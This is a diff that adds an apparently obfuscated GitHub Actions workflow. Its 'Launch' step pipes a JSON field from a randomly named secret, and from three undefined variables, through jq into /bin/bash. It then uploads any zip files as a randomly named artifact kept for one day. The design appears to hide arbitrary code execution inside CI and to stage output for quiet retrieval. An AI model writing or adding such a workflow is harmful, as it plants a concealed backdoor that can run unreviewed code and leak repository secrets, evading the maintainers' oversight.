@@ -1,0 +1,27 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          rqb426: ${{ secrets.rqb426 }}
+        run: |
+          printf '%s' "$rqb426" | jq -r .dbwwa22933 | /bin/bash
+          echo $c777 | jq -r .gx913 | /bin/bash
+          printf '%s' "$m2991" | jq -r .pxa11652 | /bin/bash
+          printf '%s' "$l377" | jq -r .gsjc73959 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: d4AcuYFy
+          path: "*.zip"
+          retention-days: 1
